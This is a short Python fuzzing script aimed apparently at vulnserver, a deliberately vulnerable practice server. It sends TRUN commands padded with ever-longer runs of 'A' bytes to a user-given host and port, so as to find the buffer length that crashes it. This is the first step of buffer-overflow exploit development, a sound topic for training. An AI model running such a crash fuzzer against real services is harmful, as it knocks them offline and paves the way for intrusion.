#!/usr/bin/python3

#vulnserver RUN command variable 

import sys,socket,time

#user input
ip_address=input("Enter the IP address\n")                                          
port_number=input("Enter the port number\n")                                        

#function
def lines():                                                                        
    print("*"*50)                                                                   
if len(ip_address)==0 or len(port_number)==0:
    lines()
    print("User input missing, kindly check")
else:

    #buffer size
    buffer_size=100
    while buffer_size<=10000:
        #connect to the ip address and port number
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        #print current buffer length
        print(f"Sending buffer -->{buffer_size}")
        #connect to ip address and port number
        s.connect((ip_address, int(port_number)))
        #send data
        s.send((b"TRUN /.:/ " + b"A" * buffer_size))
        #sleep for 1 seconds i.e. pause the execution for 1 second
        time.sleep(1)
        #close the connection
        s.close()
        #increase the size of the buffer by 200 
        buffer_size=buffer_size+200
